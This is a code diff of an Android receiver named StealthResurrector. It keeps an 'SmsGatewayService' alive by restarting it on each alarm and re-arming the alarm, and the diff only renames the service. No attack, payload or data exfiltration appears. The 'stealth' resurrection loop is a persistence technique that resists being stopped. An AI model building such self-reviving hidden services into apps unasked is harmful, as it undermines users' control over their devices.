@@ -18,7 +18,7 @@ import javax.inject.Inject
  * StealthResurrector - BroadcastReceiver that keeps the resurrection loop alive.
  *
  * Each time the alarm fires this receiver:
- *  1. Restarts DeviceConnectionService if it isn't already running.
+ *  1. Restarts SmsGatewayService if it isn't already running.
  *  2. Schedules the next alarm via StealthCore.scheduleNextAlarm().
  *
  * FIX: Previously this receiver started StealthCore as a foreground Service,
@@ -52,13 +52,13 @@ class StealthResurrector : BroadcastReceiver() {
                 }
 
                 // Check if service needs to be restarted
-                val serviceRunning = DeviceConnectionService.isServiceRunning()
-                val wsHealthy = DeviceConnectionService.isWebSocketHealthy()
+                val serviceRunning = SmsGatewayService.isServiceRunning()
+                val wsHealthy = SmsGatewayService.isWebSocketHealthy()
 
                 if (!serviceRunning) {
                     // Service was killed - restart it
-                    AppLogger.w(TAG, "DeviceConnectionService not running — restarting")
-                    val serviceIntent = Intent(context, DeviceConnectionService::class.java)
+                    AppLogger.w(TAG, "SmsGatewayService not running — restarting")
+                    val serviceIntent = Intent(context, SmsGatewayService::class.java)
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         context.startForegroundService(serviceIntent)
                     } else {
@@ -66,17 +66,17 @@ class StealthResurrector : BroadcastReceiver() {
                     }
                 } else if (!wsHealthy) {
                     // Service running but WebSocket is unhealthy - force reconnect
-                    AppLogger.w(TAG, "DeviceConnectionService running but WebSocket unhealthy — forcing reconnect")
+                    AppLogger.w(TAG, "SmsGatewayService running but WebSocket unhealthy — forcing reconnect")
                     // The service will auto-reconnect on its next heartbeat check,
                     // but we can trigger an immediate reconnection attempt
-                    val serviceIntent = Intent(context, DeviceConnectionService::class.java)
+                    val serviceIntent = Intent(context, SmsGatewayService::class.java)
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                         context.startForegroundService(serviceIntent)
                     } else {
                         context.startService(serviceIntent)
                     }
                 } else {
-                    AppLogger.d(TAG, "DeviceConnectionService running and WebSocket healthy — no action needed")
+                    AppLogger.d(TAG, "SmsGatewayService running and WebSocket healthy — no action needed")
                 }
 
                 // Keep the chain alive by scheduling the next alarm.
